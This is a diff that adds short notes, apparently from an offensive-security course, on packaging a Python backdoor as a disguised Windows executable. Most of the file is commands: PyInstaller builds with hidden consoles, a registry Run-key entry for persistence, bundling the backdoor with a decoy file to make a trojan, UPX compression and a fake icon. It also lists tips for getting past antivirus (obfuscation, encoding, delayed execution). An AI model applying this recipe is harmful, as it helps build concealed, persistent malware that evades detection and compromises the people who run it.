@@ -1,0 +1,30 @@
+To convert a Python File to a executable we use the module, "pyinstaller"
+
+Installation: pip install pyinstaller
+
+Windows Command: pyinstaller.exe [backdoor-file] --onefile --noconsole
+
+Linux Commands:
+    wine msiexec /i [installer]
+    cd /.wine/drive_c/Python/
+    wine python.exe -m install pyinstaller
+    wine /root/.wine/drive_c/Python/python.exe -m pip install [dependencies]
+    wine /root/.wine/drive_c/Python/Scripts/pyinstaller.exe [backdoor.py] --onefile --noconsole
+
+To run the backdoor everytime, we need to make a entry in the registry.
+    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "backdoor-location"
+
+Converting Backdoor to Trojan:
+        wine /root/.wine/drive_c/Python/Scripts/pyinstaller.exe [backdoor.py] --onefile --noconsole --add-data="front-file-location; location-of-malware-to-be-stored"
+
+Bypassing Anti-Virus Programs:
+    1. Use your own code, obfuscation, encode
+    2. Run trusted operations before
+    3. Delay execution of evil code
+
+Compressing a exe:
+    Tool: upx
+    Command: ./upx [backdoor.exe] [compressed-backdoor.exe]
+
+Adding Icon to the file:
+            wine /root/.wine/drive_c/Python/Scripts/pyinstaller.exe --onefile --noconsole --add-data="front-file-location; location-of-malware-to-be-stored" --icon [path-to-icon] [backdoor.py]
